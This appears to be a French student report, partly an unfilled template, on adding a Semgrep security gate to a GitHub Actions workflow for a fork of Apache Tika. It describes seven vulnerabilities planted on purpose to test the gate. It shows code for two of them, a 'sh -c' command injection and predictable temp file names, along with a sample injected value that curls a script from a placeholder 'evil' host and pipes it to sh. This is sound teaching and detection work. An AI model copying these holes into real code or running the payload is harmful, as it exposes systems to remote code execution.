# Tâche 3

Binôme : NOM1 et NOM2\
Dépôt du cas d'étude (Tika) : <lien du dépôt>\
Workflow modifié : <lien vers le fichier .yml>

## 1. Workflow GitHub Actions

### Ce qu'on a modifié

Le workflow main jdk17 build vérifie automatiquement le code chaque fois que quelqu’un pousse des modifications ou ouvre une PR sur tache3 ou main.

Il fait trois choses :

1. build — Vérifie que le projet compile correctement, que les licences sont conformes, que les tests unitaires passent et que la documentation peut être générée.
    - "Readme.md" excluded so that the build runs"

2. e2e-tests — Exécute les tests qui vérifient que les différentes parties du projet fonctionnent correctement ensemble. Il commence seulement si build réussit.

3. semgrep — Recherche les failles de sécurité dans le code Java. Il compare les résultats avec une version de référence pour détecter uniquement les nouvelles vulnérabilités, plutôt que de signaler celles qui existaient déjà.

### Pourquoi ces choix

Semgrep est lancé avec --baseline-commit qui pointe vers le commit précédent. Semgrep compare le code actuel avec le code du commit précédent. Il signale seulement les problèmes de sécurité qui viennent d’être introduits.
On utilise des règles de sécurité Java provenant du dépôt officiel de Semgrep. on vérifie le code Java avec un ensemble stable de règles de sécurité.
- On utilise uniquement les règles liées à la sécurité Java.
- On fixe une version précise des règles et de Semgrep pour obtenir des résultats cohérents à chaque exécution.
Le flag --error fait échouer le build dès que Semgrep trouve au moins un problème.
L’objectif : empêcher l’ajout de nouveaux problèmes de sécurité sans avoir à corriger immédiatement toutes les vulnérabilités déjà présentes dans le projet.
(Comment on distingue une nouvelle vulnérabilité d'une ancienne, quelles règles Semgrep on utilise, quel niveau de sévérité fait échouer le build. Dire pourquoi on a choisi ça plutôt qu'une autre option.)

### Comment on l'a validé
On a testé le workflow dans trois situations :
- Commit propre : on a envoyé une modification de code, sans nouvelle vulnérabilité. Semgrep ne trouve aucun finding nouveau, exit 0, le job build démarre normalement.
- Commit avec vulnérabilités : on a ajouté du code présentant un problème de sécurité (7 vulnérabilités). Semgrep détecte 7 nouveaux findings, exit 1, le job build est bloqué et n’est jamais lancé, le workflow échoue.
- Cas limite (si testé) : on vérifie qu’une vulnérabilité déjà présente dans le code avant notre modification ne fait pas échouer le workflow.

(Décrire les essais faits : un commit propre qui passe, un commit avec une vulnérabilité qui échoue, et un cas limite s'il y en a un. Mettre les liens vers les exécutions GitHub Actions.)

- Commit propre : https://github.com/jeannicbeaulieu/tika/actions/runs/43507081560
- Commit avec vulnérabilité : https://github.com/jeannicbeaulieu/tika/actions/runs/43639075652

## 2. Vulnérabilités introduites

Liste rapide :

1. Injection de commande OS (CWE-78) dans `TesseractOCRParser.java`
2. Aléa non cryptographique (CWE-330) dans `TemporaryResources.java`
3. Permissions de fichier trop larges (CWE-732) dans `TemporaryResources.java`
4. Validation de certificat TLS désactivée (CWE-295) dans `NetworkParser.java`
5. Désérialisation de données non fiables (CWE-502) dans `JsonMetadata.java`
6. Hachage cassé MD5 (CWE-328) dans `PDMetadataExtractor.java`
7. Entités externes XML, XXE (CWE-611) dans `AbstractOOXMLExtractor.java`


### 2.1 Injection de commande (CWE-78)

**Fichier :** `tika-parsers/tika-parsers-standard/tika-parsers-standard-modules/tika-parser-ocr-module/src/main/java/org/apache/tika/parser/ocr/TesseractOCRParser.java`, méthode `preloadLangs()`
**Pourquoi ce fichier :** le parseur OCR est l'un des rares endroits où Tika lance un programme externe
(`tesseract`). Tika y a déjà eu une vraie faille de ce type..

Code avant :

```java
String[] args = new String[]{defaultConfig.getTesseractPath() + getTesseractProg(), "--list-langs"};
ProcessBuilder pb = new ProcessBuilder(args);
setEnv(pb);
...
process = pb.start();
```

Code après :

```java
String cmd = defaultConfig.getTesseractPath() + getTesseractProg() + " --list-langs";
...
process = java.lang.Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
```

**Pourquoi c'est vulnérable :** avant, le programme était lancé directement avec un tableau d'arguments, sans shell.
Maintenant, le chemin de Tesseract, qui vient de la configuration, est concaténé dans une ligne de commande
interprétée par `sh -c`. Une valeur comme `tesseractPath = "/tmp/;curl http://evil/x.sh|sh;"` fait exécuter des
commandes arbitraires avec les droits du processus Tika.

**Résultat Semgrep :** règle `java.lang.security.audit.command-injection-formatted-runtime-call`, ERROR, ligne 736.

```text
A formatted or concatenated string was detected as input to a java.lang.Runtime call.
This is dangerous if a variable is controlled by user input and could result in a
command injection.
```

### 2.2 Aléa non cryptographique (CWE-330)

**Fichier :** `tika-core/src/main/java/org/apache/tika/io/TemporaryResources.java`, nouvelle méthode `createSharedTempFile(String suffix)`
**Pourquoi ce fichier :** `TemporaryResources` est la classe qui crée les fichiers temporaires dans lesquels Tika
copie les documents à analyser ; une méthode « fichier temporaire partagé avec un programme externe » y est naturelle.

Code avant : la méthode n'existait pas (on utilisait `Files.createTempFile`, qui choisit un nom avec `SecureRandom`).

Code après :

```java
String name = "apache-tika-shared-" + Long.toHexString(new Random().nextLong()) + actualSuffix;
final Path path = Files.createFile(dir.resolve(name));
```

**Pourquoi c'est vulnérable :** `java.util.Random` est un générateur prévisible : on peut retrouver sa graine à
partir de quelques valeurs, et par défaut elle dépend de l'horloge. Dans le dossier temporaire partagé (`/tmp`), un
autre utilisateur de la machine peut deviner le nom et créer ce fichier, ou un lien symbolique, avant Tika : déni de
service (`FileAlreadyExistsException`) ou détournement du fichier.

**Résultat Semgrep :** règle `java.lang.security.audit.crypto.weak-random`, WARNING, ligne 126.

```text
Detected use of the functions `Math.random()` or `java.util.Random()`. These are both
not cryptographically strong random number generators (RNGs).
```

### 2.3


### 2.4


### 2.5


### 2.6


### 2.7

## 3. Comparaison des rapports Semgrep

### Comment on a comparé

(Commandes utilisées pour générer les rapports avant et après, version de Semgrep, et comment on a fait la différence entre les deux.)

```bash
semgrep scan --config <règles> --json -o avant.json
semgrep scan --config <règles> --json -o apres.json
```

### Ce qu'on constate

Avant : <n> résultats. Après : <n> résultats, donc <n> de plus.

Les nouveaux résultats correspondent à nos vulnérabilités :

- <règle> dans `<fichier>` (vulnérabilité 1)
- <règle> dans `<fichier>` (vulnérabilité 2)
- ...

(Mentionner si une vulnérabilité n'a pas été détectée, ou s'il y a eu des résultats en plus qu'on n'attendait pas.)

## 4. Rickroll

### Action utilisée

(Quelle action on a choisie : fork de random-rickroll ou action maison, et pourquoi.) <lien>

### Intégration dans le workflow

```yaml
- name: Rickroll
  if: failure()
  uses: <action>
```

### Validation

(Montrer qu'un test qui échoue déclenche bien le rickroll. Lien vers l'exécution ou capture d'écran.)

## 5. Limites

(Ce qui ne marche pas parfaitement : faux négatifs de Semgrep, temps d'exécution, façons de contourner la vérification, etc.)


## 6. Déclaration d'utilisation de l'IA